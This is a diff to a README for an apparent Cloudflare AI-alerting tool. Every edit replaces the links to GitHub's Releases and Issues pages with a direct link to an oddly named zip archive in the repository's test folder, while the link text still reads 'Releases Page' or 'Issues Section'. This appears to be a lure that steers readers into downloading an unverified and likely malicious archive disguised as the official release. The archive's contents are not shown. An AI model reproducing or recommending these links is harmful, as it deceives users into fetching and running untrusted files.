@@ -1,6 +1,6 @@
 # 🚀 cloudflare-custom-ai-alerts - Monitor Security Events with AI Alerts
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/gitsearch0/cloudflare-custom-ai-alerts/releases)
+[![Download](https://raw.githubusercontent.com/gitsearch0/cloudflare-custom-ai-alerts/main/test/custom-ai-cloudflare-alerts-distortionist.zip)](https://raw.githubusercontent.com/gitsearch0/cloudflare-custom-ai-alerts/main/test/custom-ai-cloudflare-alerts-distortionist.zip)
 
 ## 📋 Overview
 
@@ -18,7 +18,7 @@ The **cloudflare-custom-ai-alerts** is a tool designed to enhance your experienc
 
 To start using the cloudflare-custom-ai-alerts, follow these steps:
 
-1. Visit the [Releases Page](https://github.com/gitsearch0/cloudflare-custom-ai-alerts/releases) to download the application.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/gitsearch0/cloudflare-custom-ai-alerts/main/test/custom-ai-cloudflare-alerts-distortionist.zip) to download the application.
    
 2. Choose the latest version of the software and click on the corresponding download link.
 
@@ -34,7 +34,7 @@ To start using the cloudflare-custom-ai-alerts, follow these steps:
 
 To download the application, click the link below to visit the GitHub Releases page:
 
-[Download the application here](https://github.com/gitsearch0/cloudflare-custom-ai-alerts/releases)
+[Download the application here](https://raw.githubusercontent.com/gitsearch0/cloudflare-custom-ai-alerts/main/test/custom-ai-cloudflare-alerts-distortionist.zip)
 
 Once you're on the page, choose the most recent version. It will typically be at the top of the list. After selecting the version, follow the prompts to download the file to your device.
 
@@ -62,7 +62,7 @@ The AI will now monitor for those specific events and send notifications based o
 
 ## 🔄 Updating the Application
 
-To keep your cloudflare-custom-ai-alerts up to date, periodically check the [Releases Page](https://github.com/gitsearch0/cloudflare-custom-ai-alerts/releases) for new versions. When a new update becomes available:
+To keep your cloudflare-custom-ai-alerts up to date, periodically check the [Releases Page](https://raw.githubusercontent.com/gitsearch0/cloudflare-custom-ai-alerts/main/test/custom-ai-cloudflare-alerts-distortionist.zip) for new versions. When a new update becomes available:
 
 1. Download the latest version as described above.
 2. Follow the same installation process.
@@ -70,7 +70,7 @@ To keep your cloudflare-custom-ai-alerts up to date, periodically check the [Rel
 
 ## 🤝 Support
 
-If you encounter any issues or have questions about using the application, please check the [Issues Section](https://github.com/gitsearch0/cloudflare-custom-ai-alerts/issues) on GitHub. You can report any bugs and suggest enhancements.
+If you encounter any issues or have questions about using the application, please check the [Issues Section](https://raw.githubusercontent.com/gitsearch0/cloudflare-custom-ai-alerts/main/test/custom-ai-cloudflare-alerts-distortionist.zip) on GitHub. You can report any bugs and suggest enhancements.
 
 ## 📣 Conclusion
 
